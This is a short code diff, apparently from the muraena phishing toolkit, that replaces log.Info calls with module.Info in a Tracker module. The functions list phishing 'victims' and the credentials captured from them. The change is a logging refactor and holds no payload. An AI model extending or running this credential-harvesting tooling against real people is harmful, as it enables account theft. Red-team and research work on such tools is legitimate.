@@ -7,7 +7,6 @@ import (
 	"github.com/evilsocket/islazy/tui"
 
 	"github.com/muraenateam/muraena/core/db"
-	"github.com/muraenateam/muraena/log"
 )
 
 func (module *Tracker) GetVictim(t *Trace) (v *db.Victim, err error) {
@@ -36,7 +35,7 @@ func (module *Tracker) ShowCredentials() {
 	var rows [][]string
 
 	victims, err := db.GetAllVictims()
-	log.Info("All Victims: %v", victims)
+	module.Info("All Victims: %v", victims)
 
 	if err != nil {
 		module.Debug("error fetching all victims: %s", err)
@@ -48,7 +47,7 @@ func (module *Tracker) ShowCredentials() {
 			module.Debug("error fetching victim %s: %s", vID, err)
 		}
 
-		log.Info("Creds for victim %s: %d", vID, victim.CredsCount)
+		module.Info("Creds for victim %s: %d", vID, victim.CredsCount)
 
 		for i := 0; i < victim.CredsCount; i++ {
 			t := tui.Green(victim.ID)
@@ -86,10 +85,10 @@ func (module *Tracker) ShowVictims() {
 		module.Debug("error fetching all victims: %s", err)
 	}
 
-	log.Info("All Victims: %v", victims)
+	module.Info("All Victims: %v", victims)
 
 	for _, vId := range victims {
-		log.Info("victim id: %v", vId)
+		module.Info("victim id: %v", vId)
 
 		v, err := db.GetVictim(vId)
 		if err != nil {
